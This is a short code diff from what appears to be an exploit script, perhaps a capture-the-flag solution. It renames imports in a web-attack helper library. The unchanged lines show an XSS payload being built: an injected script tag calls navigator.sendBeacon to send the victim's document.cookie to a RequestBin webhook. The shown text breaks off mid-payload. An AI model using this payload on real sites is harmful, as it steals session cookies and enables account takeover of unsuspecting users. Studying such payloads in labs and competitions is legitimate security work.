@@ -2,11 +2,11 @@ import sys
 sys.path.append('../')
 
 import WebUtils
-from WebUtils.HTTPSync import *
-from WebUtils.HTTPHost import https_host
+from WebUtils.Sync import *
+from WebUtils.Host import https_host
 from WebUtils.Websocket import SocketIO
-from WebUtils.HTTPWebhook import RequestBinWebHook
-from WebUtils.HTTPEncodings import encodeURIComponent
+from WebUtils.Webhook import RequestBinWebhook
+from WebUtils.Encodings import encodeURIComponent
 from WebUtils.JSCore import he_encode
 import re
 from time import sleep
@@ -22,7 +22,7 @@ cookies = {
 }
 print(token)
 
-with RequestBinWebHook('enbit6i3l2ra4') as hook:
+with RequestBinWebhook('enbit6i3l2ra4') as hook:
     xss = encodeURIComponent("""
     <script>
     navigator.sendBeacon(`""" + hook.url + """`, document.cookie)
